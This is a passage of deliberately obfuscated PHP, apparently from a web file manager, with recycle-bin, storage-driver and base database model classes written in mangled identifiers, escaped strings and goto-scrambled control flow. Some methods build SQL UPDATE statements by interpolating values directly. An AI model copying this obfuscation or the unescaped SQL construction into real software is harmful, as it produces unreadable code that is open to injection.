$Dɽ; } goto A; A: $eؓ = array(); $eؓ[$Cþ[2320]] = array($Cþ[2321] => LNG($Cþ[2320]), $Cþ[2322] => $this->where($FИ)->count(), $Cþ[516] => $this->where($FИ)->sum($Cþ[77])); $Fᅩ̍ = KodIO::fileTypeList(); goto d犹ʢ; E: $Cþ =& $_SERVER[ԥ]; $E = $Cþ[2319] . $fܵ . $Cþ[70] . $Dɽ; $dь = Cache::get($E); goto C; A͝ι: } public function fileNameExist($Cń, $C) { $CĂ =& $_SERVER[ԥ]; $eߨ = $this->childList($Cń); foreach ($eߨ as $DԶݸ) { if ($DԶݸ[$CĂ[28]] == $C) { return $DԶݸ[$CĂ[365]]; } } return !1; } public function childList($b˥) { goto B; B: $c󌼠 =& $_SERVER[ԥ]; $dך = $c󌼠[2300] . $b˥; if (isset(self::$cacheChildList[$dך])) { return self::$cacheChildList[$dך]; } goto BׄЮ; BׄЮ: $Bɯ = array($c󌼠[457] => intval($b˥), $c󌼠[393] => 0); $Bܥ = $this->where($Bɯ)->select(); $Bܥ = $Bܥ ? $Bܥ : array(); goto bമ; bമ: self::$cacheChildList[$dך] = $Bܥ; foreach ($Bܥ as $AЭ) { $dך = $c󌼠[406] . $AЭ[$c󌼠[365]]; self::$cacheSourceInfo[$dך] = $AЭ; } return $Bܥ; goto B; B: } public function fileNameAuto($Bە, $Cܾ, $bɂ = REPEAT_RENAME, $D = false) { $aɽ =& $_SERVER[ԥ]; $b = $this->childList($Bە); $dɥ = array_to_keyvalue($b, $aɽ[33], $aɽ[28]); return $this->fileNameAutoGet($dɥ, $Cܾ, $bɂ, $D); } public function fileNameAutoGet($dግ, $e쩲, $D, $e) { $e =& $_SERVER[ԥ]; if ($D == REPEAT_REPLACE || !$dግ || !in_array_not_case($e쩲, $dግ) || $e && $D != REPEAT_RENAME_FOLDER) { return $e쩲; } if ($D == REPEAT_SKIP) { return !1; } $c = $e[91] . get_path_ext($e쩲); $c = $c == $e[91] || $e ? $e[33] : $c; for ($b = 1; $b <= count($dግ) + 1; $b++) { $E = substr($e쩲, 0, strlen($e쩲) - strlen($c)); $a = $E . "\50{$b}\51{$c}"; if (!in_array_not_case($a, $dግ)) { return $a; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\x72\x63\145\137\x72\145\143\x79\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\124\x69\x6d\145", "\x74\151\x6d\145", "\x69\156\x73\x65\162\x74", "\146\165\156\143\x74\x69\x6f\156")); public function listData($e = false) { $c =& $_SERVER[ԥ]; $e = $e ? $e : USER_ID; $C = $this->where(array($c[1395] => $e))->select(); return array_to_keyvalue($C, $c[33], $c[365]); } public function moveToRecycle($d) { goto B絶; B絶: $Bέ =& $_SERVER[ԥ]; $E = Model($Bέ[1093]); $Bʏ = $E->sourceInfo($d); goto e; e: if (!$Bʏ || $Bʏ[$Bέ[393]] == $Bέ[83]) { return; } $bю = array($Bέ[379] => $d, $Bέ[1395] => USER_ID, $Bέ[517] => $Bʏ[$Bέ[367]], $Bέ[518] => $Bʏ[$Bέ[452]], $Bέ[521] => $Bʏ[$Bέ[455]]); $this->add($bю); goto F̛; F̛: $this->recycleMove($d, 1); if ($Bʏ[$Bέ[366]] == $Bέ[83]) { $B艳 = array($Bέ[521] => array($Bέ[479], $Bʏ[$Bέ[455]] . $d . $Bέ[480])); $E->where($B艳)->setField($Bέ[393], 1); } goto F󼚢к; F󼚢к: } public function clear() { $this->remove(!1); } public function remove($DЊ = false) { goto B𚲋; B𚲋: $c̴ =& $_SERVER[ԥ]; $C͊ = Model($c̴[1093]); $d = $this->listData(); goto Aʴء; fϋ: foreach ($fˊݛ as $F٠ז) { $C͊->targetSpaceUpdate($F٠ז[$c̴[367]], $F٠ז[$c̴[452]]); } goto E׫އ; Aʴء: $DЊ = $DЊ === !1 ? !1 : $DЊ; $fˊݛ = array(); foreach ($d as $cᵋչ) { if ($DЊ != !1 && !in_array($cᵋչ, $DЊ)) { continue; } $C͊->remove($cᵋչ, !1); $C΢ = $this->where(array($c̴[365] => $cᵋչ))->find(); $eљӑ = $C΢[$c̴[367]] . $c̴[70] . $C΢[$c̴[452]]; $fˊݛ[$eљӑ] = array($c̴[517] => $C΢[$c̴[367]], $c̴[452] => $C΢[$c̴[452]]); $this->where(array($c̴[365] => $cᵋչ))->delete(); } goto fϋ; E׫އ: } public function restore($CҴ = false) { goto B΂; A: $CҴ = $CҴ == !1 ? !1 : $CҴ; if (!$c) { return !0; } $EƇ = array(); goto d䆰; B΂: $aѧ =& $_SERVER[ԥ]; $e䍦 = Model($aѧ[1093]); $c = $this->listData(); goto A; d䆰: foreach ($c as $c䂦ۗ) { goto B׹̫; dճ: if ($C[$aѧ[366]] == $aѧ[83]) { $b = array($aѧ[521] => array($aѧ[479], $C[$aѧ[455]] . $c䂦ۗ . $aѧ[480])); $e䍦->where($b)->setField($aѧ[393], 0); $this->restoreFolderChildren($c䂦ۗ, $c); } $this->where(array($aѧ[365] => $c䂦ۗ))->delete(); $e䍦->folderSizeReset($C[$aѧ[457]]); goto f癨; B׹̫: if ($CҴ != !1 && !in_array($c䂦ۗ, $CҴ)) { continue; } $C = $e䍦->sourceInfo($c䂦ۗ); $B񾠢מ = $e䍦->sourceInfo($C[$aѧ[457]]); goto fȄ; f癨: $EƇ[] = $C[$aѧ[457]]; if ($C[$aѧ[366]] == $aѧ[83]) { $EƇ[] = $c䂦ۗ; } $e䍦->lockMoveEnd($c䂦ۗ); goto eώ; fȄ: if ($B񾠢מ[$aѧ[393]] == $aѧ[83]) { continue; } $e䍦->lockMoveStart($c䂦ۗ); $this->recycleMove($c䂦ۗ, 0); goto dճ; eώ: } $e䍦->updateModifyTime($EƇ); goto Cڌ; Cڌ: } private function restoreFolderChildren($bѭ, $b̳ݺ) { goto d; A: foreach ($b̳ݺ as $b) { if ($b == $bѭ) { continue; } if (!$A׆->isParentOf($bѭ, $b)) { continue; } $A = $A׆->sourceInfo($b); if ($A[$Fϔ[366]] == $Fϔ[83]) { $B׋񨇥[] = array($Fϔ[521] => array($Fϔ[479], $A[$Fϔ[455]] . $b . $Fϔ[480])); } else { $B׋񨇥[$Fϔ[365]][1][] = $b; } } if (!$B׋񨇥[$Fϔ[365]][1]) { unset($B׋񨇥[$Fϔ[365]]); } if (!$B׋񨇥) { return; } goto F; d: $Fϔ =& $_SERVER[ԥ]; $A׆ = Model($Fϔ[1093]); $B׋񨇥 = array($Fϔ[365] => array($Fϔ[7], array())); goto A; F: $B׋񨇥[$Fϔ[365]][1] = array_unique($B׋񨇥[$Fϔ[365]][1]); $B׋񨇥[$Fϔ[899]] = $Fϔ[2146]; $A׆->where($B׋񨇥)->setField($Fϔ[393], 1); goto fџ; fџ: } private function recycleMove($aɫ, $Cߊ = 1) { $c =& $_SERVER[ԥ]; $c܅ = Model($c[1093]); $Aֱ = Model($c[2323]); $e쌅ӎ = array($c[365] => $aɫ); if ($Cߊ) { $c܅->where($e쌅ӎ)->setField($c[393], 1); $Aֱ->eventRecycle($aɫ, $c[2324]); } else { $d = $c܅->where($e쌅ӎ)->find(); $f﹏ = $d[$c[366]] == $c[83]; $Eǿۍ = $c܅->fileNameAuto($d[$c[457]], $d[$c[28]], REPEAT_RENAME_FOLDER, $f﹏); if ($Eǿۍ != $d[$c[28]]) { $c܅->rename($aɫ, $Eǿۍ); } $c܅->where($e쌅ӎ)->setField($c[393], 0); $Aֱ->eventRecycle($aɫ, $c[2325]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x73\164\x6f\162\x61\x67\x65\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\x73\151\x7a\x65\115\141\170", "\163\171\x73\x74\x65\155", "\x64\x65\146\141\x75\154\164", "\144\162\x69\x76\145\x72", "\143\157\156\146\151\x67"); public function listData($aɎ = false, $FÍ = "\x6d\x6f\144\151\146\x79\x54\x69\155\145", $D = false) { goto A¼戔; D: foreach ($B߾ as $BƵ => $E떭) { unset($B߾[$BƵ][$eѴş[6]]); $B߾[$BƵ][$eѴş[2052]] = 0; } $D = array_to_keyvalue($B߾, $eѴş[33], $eѴş[363]); $this->_listAppendSize($B߾, $D); goto d鸪; A¼戔: $eѴş =& $_SERVER[ԥ]; $B߾ = parent::listData($aɎ, $FÍ, $D); if ($aɎ) { return $B߾; } goto D; d鸪: return $B߾; goto b酻; b酻: } public function _listAppendSize(&$b, $a) { $AÓ =& $_SERVER[ԥ]; $C铗 = $AÓ[2326] . implode($AÓ[47], $a) . $AÓ[2327]; $F = Model($AÓ[703])->query($C铗); $F = array_to_keyvalue($F, $AÓ[363], $AÓ[77]); foreach ($b as $Dս => $d) { $b[$Dս][$AÓ[2052]] = isset($F[$d[$AÓ[363]]]) ? $F[$d[$AÓ[363]]] : 0; } } public function getConfig($f) { $Aڋ = parent::listData($f); return json_decode($Aڋ[$_SERVER[ԥ][6]], !0); } public function update($b˔, $Bݡ) { goto dŝ; aȳ: if (isset($D[$fפ֧]) && $D[$fפ֧][$b[363]] != $b˔) { return !1; } if (isset($Bݡ[$b[2328]]) && $Bݡ[$b[2328]] == $b[83]) { $this->checkConfig($Bݡ); } unset($Bݡ[$b[2328]]); goto d; dŝ: $b =& $_SERVER[ԥ]; $fפ֧ = $Bݡ[$b[28]]; $D = array_to_keyvalue(parent::listData(), $b[28]); goto aȳ; d: $BŲ = parent::update($b˔, $Bݡ); if ($BŲ && $Bݡ[$b[34]]) { foreach ($D as $A䈞阊) { if ($A䈞阊[$b[34]] && $A䈞阊[$b[363]] != $b˔) { parent::update($A䈞阊[$b[363]], array($b[34] => 0)); } } } return $BŲ; goto CҌ; CҌ: } public function add($Aߦ) { goto eߜ; fř쵄: return $CԐý; goto C嘈; fƫ: $this->checkConfig($Aߦ); $CԐý = parent::insert($Aߦ); if ($CԐý && $Aߦ[$C웵[34]]) { foreach ($d as $Fݿ) { if ($Fݿ[$C웵[34]]) { parent::update($Fݿ[$C웵[363]], array($C웵[34] => 0)); } } } goto fř쵄; eߜ: $C웵 =& $_SERVER[ԥ]; $d = array_to_keyvalue(parent::listData(), $C웵[28]); if (isset($d[$Aߦ[$C웵[28]]])) { return !1; } goto fƫ; C嘈: } public function checkConfig(&$EǍ) { goto b; b: $F =& $_SERVER[ԥ]; $BƆ = strtolower($EǍ[$F[90]]); $Fļ = json_decode($EǍ[$F[6]], !0); goto f; dşʼ: $EǍ[$F[6]] = json_encode($Fļ); $EǍ[$F[90]] = $f; return !0; goto B򌎇ג; c: $Cݡ = $a﯒->getPath($E . $F[1948]); if (!$a﯒->mkfile($Cݡ)) { show_json(LNG($F[2329]), !1); } $Fļ[$F[1007]] = $E; goto dşʼ; f: foreach ($Fļ as $A => $a޲) { $Fļ[$A] = trim($a޲); } $E = rtrim($Fļ[$F[1007]], $F[8]) . $F[8]; $f = $this->driverType($BƆ); goto C޵; C޵: $f = $F[71] . $f; $a﯒ = new $f($Fļ); if (in_array($BƆ, $a﯒->objectDriver)) { if (!$a﯒->isBucketCors() && !$a﯒->setBucketCors()) { $D = LNG($F[2329]); $D .= $F[2330] . LNG($F[2331]); show_json($D, !1); } } goto c; B򌎇ג: } private function driverType($c) { $CԎ =& $_SERVER[ԥ]; $Eߎӓ = array($CԎ[101] => $CԎ[2332], $CԎ[58] => $CԎ[2333], $CԎ[64] => $CԎ[2334]); if (isset($Eߎӓ[$c])) { return $Eߎӓ[$c]; } return strtoupper($c); } public function driverListSystem() { $DݜՖ =& $_SERVER[ԥ]; $b彵 = parent::listData(); $b􏂤 = array(); foreach ($b彵 as $Aζх) { unset($Aζх[$DݜՖ[183]], $Aζх[$DݜՖ[106]]); $Aζх[$DݜՖ[6]] = json_decode($Aζх[$DݜՖ[6]], !0); $b􏂤[] = $Aζх; } return $b􏂤; } public function defaultDriver() { $fǊ =& $_SERVER[ԥ]; $F = parent::listData(); $e = array_filter_by_field($F, $fǊ[34], 1); $e = $e[0]; if ($e) { $e[$fǊ[6]] = json_decode($e[$fǊ[6]], !0); } return $e; } public function driverInfo($d݋テ) { $B =& $_SERVER[ԥ]; $eх = array_to_keyvalue(parent::listData(), $B[363]); if (!isset($eх[$d݋テ])) { return !1; } $Bǯ = $eх[$d݋テ]; $Bǯ[$B[6]] = json_decode($Bǯ[$B[6]], !0); return $Bǯ; } public function remove($C) { $this->removeShareItems($C); return parent::remove($C); } public function removeWithFile($b) { goto E; c: $d߮->task[$F곪Է[682]] = (double) $C; $eː = KodIO::defaultDriver(); $Bɟ = $eː[$F곪Է[363]]; goto Cڅ; E: $F곪Է =& $_SERVER[ԥ]; $e = array($F곪Է[735] => $b); $BĞ = Model($F곪Է[418])->where($e)->count(); goto FŠ; FŠ: $C = Model($F곪Է[418])->where($e)->sum($F곪Է[77]); $dӅȂ = $F곪Է[2335] . $b; $d߮ = new TaskFileTransfer($dӅȂ, $F곪Է[2336], $BĞ, LNG($F곪Է[2337]) . "\x28{$b}\x29"); goto c; Cڅ: $b貚 = "\x7b\151\157\72{$Bɟ}\x7d\57"; $B = !0; $eل = array(); goto A; A: $ḛ = Model($F곪Է[163])->where($e)->field($F곪Է[2338])->select(); foreach ($ḛ as $f) { goto B忡ɸ; e♪: $C⛩ރ = array($F곪Է[735] => $Bɟ, $F곪Է[75] => $A͗ȍ); Model($F곪Է[163])->where($e)->save($C⛩ރ); goto Bѵ; B忡ɸ: $bӦ = $f[$F곪Է[75]]; $A͗ȍ = $b貚 . str_replace("\173\x69\157\72{$b}\x7d\57", $F곪Է[33], $bӦ); if (!IO::exist($bӦ)) { $eل[] = $f[$F곪Է[415]]; $d߮->updateFileEnd($f[$F곪Է[28]], $f[$F곪Է[77]]); continue; } goto C; C: if (IO::exist($A͗ȍ)) { $d߮->updateFileEnd($f[$F곪Է[28]], $f[$F곪Է[77]]); continue; } if (!IO::move($bӦ, get_path_father($A͗ȍ))) { $B = !1; break; } $e = array($F곪Է[415] => $f[$F곪Է[415]]); goto e♪; Bѵ: } $this->removeByFileID($eل); goto BĎ; BĎ: if (!$B) { $d߮->stop($dӅȂ); return !1; } $d߮->end(); $this->remove($b); goto cʅЎ; cʅЎ: } public function progress($E에) { return Task::get($_SERVER[ԥ][2335] . $E에); } private function removeByFileID($Fׂ = array()) { goto cҜᥳ; aϾ̓: $Bސ = Model($eܮ[1093])->where($d鱗)->field($eܮ[365])->select(); if (!$Bސ) { return; } $Bސ = array_to_keyvalue($Bސ, $eܮ[33], $eܮ[365]); goto e߶͘; e߶͘: foreach ($Bސ as $C) { Model($eܮ[378])->removeNow($C, !1); } goto eғ; cҜᥳ: $eܮ =& $_SERVER[ԥ]; if (empty($Fׂ)) { return; } $d鱗 = array($eܮ[415] => array($eܮ[7], $Fׂ)); goto aϾ̓; eғ: } private function removeShareItems($dԉ) { goto e; e: $d =& $_SERVER[ԥ]; $bڳ = "\x7b\151\157\x3a{$dԉ}\175\x2f"; $D = array($d[365] => 0, $d[1001] => array($d[743], "{$bڳ}\x25")); goto Eխ; FȆ: Model($d[532])->remove($Eք); goto Dɧֆ; Eխ: $Eȩ = Model($d[2043])->where($D)->field($d[437])->select(); if (empty($Eȩ)) { return; } $Eք = array_to_keyvalue($Eȩ, $d[33], $d[437]); goto FȆ; Dɧֆ: } } goto a㐅ԕ; c: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\x66\x79\124\x69\155\145", "\x74\151\x6d\145", "\151\x6e\163\145\162\x74\54\x75\160\144\x61\164\145", "\x66\165\x6e\143\164\x69\x6f\x6e"), array("\x63\x72\145\x61\x74\x65\x54\x69\155\145", "\x74\x69\x6d\x65", "\x69\156\x73\145\x72\x74", "\146\x75\x6e\143\164\x69\x6f\156")); public function setDataAuto($Eٚ) { $this->dataAuto = $Eٚ; } public function __construct($Fݍ = '', $A֘ = '', $C = '') { parent::__construct($Fݍ, $A֘, $C); } public static function textEncode($Fݬ) { if (!$Fݬ) { return $Fݬ; } $b = json_encode($Fݬ); $b = preg_replace_callback($_SERVER[ԥ][338], function ($Bؤ) { return addslashes($Bؤ[0]); }, $b); return json_decode($b); } public static function textDecode($D) { $EɊ =& $_SERVER[ԥ]; $Fٴ = json_encode($D); $Fٴ = preg_replace_callback($EɊ[339], function ($cǇ) { return $_SERVER[ԥ][93]; }, $Fٴ); return json_decode($Fٴ); } protected $tableMeta = array(); protected function _beforeInsert(&$cӻᐰ, $bǽݪ) { $Fן =& $_SERVER[ԥ]; if (!$this->checkDataAutoHas($Fן[340])) { return; } $this->dataBeforeFilter($cӻᐰ, $Fן[340]); } protected function _beforeUpdate(&$E, $fؘ) { $e =& $_SERVER[ԥ]; if (!$this->checkDataAutoHas($e[341])) { return; } $this->dataBeforeFilter($E, $e[341]); } protected function _afterSelect(&$b, $c) { if (!is_array($b)) { return; } if (!$this->checkDataAutoHas($_SERVER[ԥ][342])) { return; } foreach ($b as &$eܡѮ) { $this->dataAfterFilter($eܡѮ); } } protected function _afterFind(&$bؔ, $D΋Ǭ) { if (!is_array($bؔ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ԥ][342])) { return; } $this->dataAfterFilter($bؔ); } public function setAutoIncrement($A͇) { $b׎ = array($this->getPk() => $A͇); $Dܹ = $this->data($b׎)->add(); if ($Dܹ) { $this->delete($Dܹ); } } public function getAutoIncrement() { $c􃗔 = $this->getTableName(); $C = $this->max($this->getPk()); $E = $this->query("\x73\150\157\x77\40\164\x61\x62\x6c\x65\x20\x73\164\x61\x74\x75\x73\x20\x77\150\145\162\145\x20\116\x61\155\145\75\x27{$c􃗔}\x27"); $d餺 = $E[0][$_SERVER[ԥ][343]]; $e㋄ = max($C, $d餺); return $e㋄; } protected function _callBefore($A≙, $A) { return $this->cacheCallCheck($A≙, $A, !1); } protected function _callAfter($C, $dǺƳ) { return $this->cacheCallCheck($C, $dǺƳ, !0); } protected function cacheFunctionAlias($bù) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($d񬅵٘, $f̊, $A = false) { $CΕ = $this->cacheFunctionAlias($f̊); if (!$CΕ) { return; } foreach ($CΕ as $bؤǕ => $b̻؃) { $e = $b̻؃[0]; $DӒϠԆ = explode($_SERVER[ԥ][47], $b̻؃[1]); if ($d񬅵٘ == $bؤǕ) { return $this->cacheFunctionGet($bؤǕ, $e); } if ($A && in_array($d񬅵٘, $DӒϠԆ)) { $this->cacheFunctionClear($bؤǕ, $e); } } } public function cacheFunctionGet($Dٍ̋, $c) { $Fʖ = $this->cacheKeyMake($Dٍ̋, $c); $e = Cache::get($Fʖ); if (!is_array($e)) { $e = call_user_func_array(array($this, $Dٍ̋), array($c, !0)); Cache::set($Fʖ, $e); } return $e; } public function cacheFunctionClear($aݞʡ, $Aㄏ) { $e䚊 = $Aㄏ; if (!is_array($Aㄏ)) { $e䚊 = array($Aㄏ); } foreach ($e䚊 as $bʟ⇇) { $c = $this->cacheKeyMake($aݞʡ, $bʟ⇇); Cache::remove($c); } } private function cacheKeyMake($c̊ڧء, $fΐ) { $Dł =& $_SERVER[ԥ]; return get_class($this) . $Dł[70] . $c̊ڧء . $Dł[344] . $fΐ; } protected function selectPage($b͔ = 200, $FĊ = 1) { goto aϻЅ; B̦: $this->optionsValue($e䑔ƙ); $Fڇ = $this->page($FĊ, $b͔)->select(); $Fڇ = is_array($Fڇ) ? $Fڇ : array(); goto b֐; c: $EѢ = intval($this->count()); $b͔ = intval($b͔); $b͔ = $b͔ <= 5 ? 5 : ($b͔ >= $B𞒗 ? $B𞒗 : $b͔); goto bΊ; b﫺: $b = $e䑔ƙ; $b[$b˨[346]] = array(); $this->optionsValue($b); goto c; e̓: $B𞒗 = 4000; $b͔ = isset($in[$b˨[345]]) ? $in[$b˨[345]] : $b͔; if ($b͔ === -1) { unset($in[$b˨[345]]); $B𞒗 = 100000000; $b͔ = $B𞒗; } goto b﫺; b֐: if ($c˹ == 1) { $EѢ = count($Fڇ); } $Fȸᇝ = array($b˨[347] => array($b˨[348] => $EѢ, $b˨[345] => $b͔, $b˨[336] => $FĊ, $b˨[349] => $c˹), $b˨[350] => $Fڇ ? $Fڇ : array()); return $Fȸᇝ; goto F訵; aϻЅ: $b˨ =& $_SERVER[ԥ]; global $in; $e䑔ƙ = $this->optionsValue(); goto e̓; bΊ: $c˹ = ceil($EѢ / $b͔); $FĊ = intval(isset($in[$b˨[336]]) ? $in[$b˨[336]] : $FĊ); $FĊ = $FĊ <= 1 ? 1 : ($FĊ >= $c˹ ? $c˹ : $FĊ); goto B̦; F訵: } protected function checkLength($A劉, $C퐄 = 0, $F = '') { $Eƍϴ =& $_SERVER[ԥ]; $C퐄 = $C퐄 ? $C퐄 : 65536; if (!$A劉 || strlen($A劉) < $C퐄) { return; } $F = $F ? $F . $Eƍϴ[67] : $Eƍϴ[33]; show_json($F . LNG($Eƍϴ[351]) . "\x28{$C퐄}\51", !1); } protected function metaSet($AǕ, $e = null, $A㞋 = null) { goto f; f鏜: $b⨩ = $this->tableMeta[$E⏻[353]]; $d = Model($b⨩); $cۥ = array($CȖ => $AǕ, $E⏻[354] => $e); goto eǐ✿; f: $E⏻ =& $_SERVER[ԥ]; if (!$this->tableMeta) { return !1; } $CȖ = $this->tableMeta[$E⏻[352]]; goto f鏜; Dݶ: $d->where(array($CȖ => $AǕ))->addAll($f, array(), !0); return !0; goto eу; b: if (is_string($e)) { $B[$e] = $A㞋; } $f = array(); foreach ($B as $cנ => $C) { $this->checkLength($C, !1, $b⨩ . $E⏻[4] . $cנ); $f[] = array($CȖ => $AǕ, $E⏻[89] => $cנ, $E⏻[355] => $C); } goto Dݶ; eǐ✿: if (is_null($e)) { return $d->where(array($CȖ => $AǕ))->delete(); } if (is_null($A㞋)) { return $d->where($cۥ)->delete(); } $B = is_array($e) ? $e : array(); goto b; eу: } public function metaGet($Aǎ) { goto A; A: $eů =& $_SERVER[ԥ]; if (!$this->tableMeta) { return array(); } $e✬ = $this->tableMeta[$eů[352]]; goto dк; a݃: $eܼ = array_to_keyvalue($eܼ, $eů[89], $eů[355]); return $eܼ; goto c̛; dк: $b = Model($this->tableMeta[$eů[353]]); $fꨮѥ = array($e✬ => $Aǎ); $eܼ = $b->field($eů[356])->where($fꨮѥ)->select(); goto a݃; c̛: } private function checkDataAutoHas($aǴ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $aב) { if (in_array($aǴ, explode($_SERVER[ԥ][47], $aב[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$EР, $D؉) { $Bڽ =& $_SERVER[ԥ]; foreach ($this->dataAuto as $aʂМԉ) { $b¥ = $aʂМԉ[0]; if (!in_array($D؉, explode($Bڽ[47], $aʂМԉ[2]))) { continue; } switch (trim($aʂМԉ[3])) { case $Bڽ[305]: case $Bڽ[306]: $dዳ̰ = $aʂМԉ[1]; $CƯ = isset($aʂМԉ[4]) ? (array) $aʂМԉ[4] : array(); if ($dዳ̰ == $Bڽ[186] && array_key_exists($b¥, $EР)) { if (!$EР[$b¥]) { unset($EР[$b¥]); } break; } if (isset($EР[$b¥])) { array_unshift($CƯ, $EР[$b¥]); } if ($Bڽ[305] == $aʂМԉ[3]) { $EР[$b¥] = call_user_func_array($dዳ̰, $CƯ); } else { $EР[$b¥] = call_user_func_array(array(&$this, $dዳ̰), $CƯ); } break; case $Bڽ[257]: $EР[$b¥] = $EР[$aʂМԉ[1]]; break; case $Bڽ[278]: if (isset($EР[$b¥]) && !is_string($EР[$b¥])) { $EР[$b¥] = json_encode_force($EР[$b¥]); } break; case $Bڽ[307]: if ($EР[$b¥] === $Bڽ[33]) { unset($EР[$b¥]); } break; case $Bڽ[308]: $EР[$b¥] = $aʂМԉ[1]; default: break; } } if ($D؉ == $Bڽ[340]) { $b͜ = strtolower($this->db->getDbType()); if (strpos($b͜, $Bڽ[9]) !== 0) { return; } $Eֵ = $this->field(!0)->fields; $Bߨ = $Eֵ[$Bڽ[236]]; if (isset($Eֵ[$Bڽ[235]])) { unset($Bߨ[$Eֵ[$Bڽ[235]]]); } foreach ($Bߨ as $c => $D؉) { if (!isset($EР[$c])) { $EР[$c] = $Bڽ[33]; } } } } private function dataAfterFilter(&$cר) { $B椩 =& $_SERVER[ԥ]; foreach ($this->dataAuto as $Cݺ) { $A꪿ = $Cݺ[0]; if (!in_array($B椩[342], explode($B椩[47], $Cݺ[2]))) { continue; } if (!isset($cר[$A꪿])) { continue; } switch (trim($Cݺ[3])) { case $B椩[305]: case $B椩[306]: $CԪ = isset($Cݺ[4]) ? (array) $Cݺ[4] : array(); array_unshift($CԪ, $cר[$A꪿]); if ($B椩[305] == $Cݺ[3]) { $cר[$A꪿] = call_user_func_array($Cݺ[1], $CԪ); } else { $cר[$A꪿] = call_user_func_array(array(&$this, $Cݺ[1]), $CԪ); } break; case $B椩[257]: $cר[$A꪿] = $cר[$Cݺ[1]]; break; case $B椩[278]: $b = $cר[$A꪿]; $cר[$A꪿] = json_decode($b, !0); if (is_null($cר[$A꪿])) { $cר[$A꪿] = $b; } break; case $B椩[307]: if ($cר[$A꪿] === $B椩[33]) { unset($cר[$A꪿]); } break; case $B椩[308]: $cר[$A꪿] = $Cݺ[1]; default: break; } } } public function saveAll($dӋ͠) { goto cΥ; Dׂ: $cބ = array(); $A = count($dӋ͠); for ($B⛕ = 0; $B⛕ < $A; $B⛕++) { $B = $dӋ͠[$B⛕]; if (!is_array($B) || count($B) != 4) { continue; } $e = "\125\120\104\x41\124\x45\40{$c}\x20\x53\x45\x54\40{$B[2]}\x20\x3d\x20\103\x41\x53\105\x20{$B[0]}\40\12"; if ($Bё == 0) { $e = $e; } $cބ[] = $Aֱ[112] . $B[1] . $Aֱ[112]; $Bё++; $e .= "\40\127\110\x45\116\x20\47{$B[1]}\x27\40\x54\x48\105\x4e\40\x27{$B[3]}\47\x20\12"; if ($Bё == $a٭ || $B⛕ == $A - 1) { goto F싷; A̅ԑ: $cބ = array(); goto C; F싷: $eŇ = implode($Aֱ[47], $cބ); $e .= "\x20\105\116\x44\40\40\x57\110\x45\122\x45\40{$B[0]}\x20\111\116\40\x28{$eŇ}\x29\40"; $this->execute($e); goto Fꈩ; Fꈩ: $Bё = 0; $e = $e; $this->chunkEventCheck(count($cބ)); goto A̅ԑ; C: } } goto F; F: $this->chunkEventSet(); goto D; a㫘: $dӋ͠ = is_array($dӋ͠) ? $dӋ͠ : array(); $e = $Aֱ[357]; $Bё = 0; goto Dׂ; cΥ: $Aֱ =& $_SERVER[ԥ]; $c = $this->tablePrefix . $this->tableName; $a٭ = self::SQL_WHERE_IN_CHUNK; goto a㫘; D: } public function saveAllEach($B) { $d =& $_SERVER[ԥ]; $a较 = $this->tablePrefix . $this->tableName; foreach ($B as $bǽ) { if (!is_array($bǽ) || count($bǽ) != 4) { continue; } $aÓ = $bǽ[0] . $d[358] . $bǽ[1] . $d[112]; $fޙ = $bǽ[2] . $d[358] . $bǽ[3] . $d[112]; $Cл = "\165\x70\144\141\164\x65\x20{$a较}\40\x73\x65\x74\40{$fޙ}\40\x77\150\x65\x72\145\40{$aÓ}\x3b"; $this->execute($Cл); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($aލ = false, $fއѧ = false) { $this->_chunkEvent = $aލ; $this->_chunkEventParam = $fއѧ; } private function chunkEventCheck($Aȳ) { if (!$this->_chunkEvent) { return; } $dʋ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $dʋ[$_SERVER[ԥ][359]] = $Aȳ; Hook::trigger($this->_chunkEvent, $dʋ); } public function addAll($b, $f = array(), $dҧĲ = false) { goto F; F: $EܘӨ =& $_SERVER[ԥ]; ignore_timeout(); $AЕ = self::SQL_WHERE_IN_CHUNK; goto C; C: if (empty($b)) { $this->error = think_lang($EܘӨ[255]); return !1; } $f = $this->_parseOptions($f); foreach ($b as $b => $Cƍ) { $b[$b] = $this->_facade($Cƍ); $this->_beforeInsert($b[$b], $f); } goto ãْ; ãْ: if (method_exists($this->db, $EܘӨ[256])) { for ($bѤ = 0; $bѤ < count($b); $bѤ += $AЕ) { $Fκ۩ = array_slice($b, $bѤ, $AЕ); if (!is_array($Fκ۩) || count($Fκ۩) == 0) { break; } $eϲ = $this->db->insertAll($Fκ۩, $f, $dҧĲ); $this->chunkEventCheck(count($Fκ۩)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($b as $b => $Cƍ) { $eϲ = $this->db->insert($Cƍ, $f, $dҧĲ); } $this->commit(); } if (!1 !== $eϲ) { $A߃ = $this->getLastInsID(); if ($A߃) { return $A߃; } } return $eϲ; goto Fĕ; Fĕ: } public function save($d鲑߹ = '', $B = array()) { goto dŊ; dŊ: $A =& $_SERVER[ԥ]; $a« = self::SQL_WHERE_IN_CHUNK; $aǹ޺ = $this->optionsValue(); goto E䂇; eſ鳡: $B = $aǹ޺[$A[259]][$F̃][1]; $B = is_array($B) ? $B : array(); $f἖ݍ = count($B); goto c; E䂇: $F̃ = $this->findWhereField($aǹ޺); if (!$F̃) { return parent::save($d鲑߹, $B); } $EԠ = 0; goto eſ鳡; c: for ($Dخ = 0; $Dخ < $f἖ݍ; $Dخ += $a«) { $c씫ۏ = array_slice($B, $Dخ, $a«); if (!is_array($c씫ۏ) || count($c씫ۏ) == 0) { break; } $aǹ޺[$A[259]][$F̃][1] = $c씫ۏ; $this->optionsValue($aǹ޺); $EԠ += parent::save($d鲑߹, $B); $this->chunkEventCheck(count($c씫ۏ)); } $this->chunkEventSet(); return $EԠ; goto C޲đ; C޲đ: } public function add($aȋ˙ = '', $b = array(), $C܃ӎ = false) { if ($this->addTaskStatus && 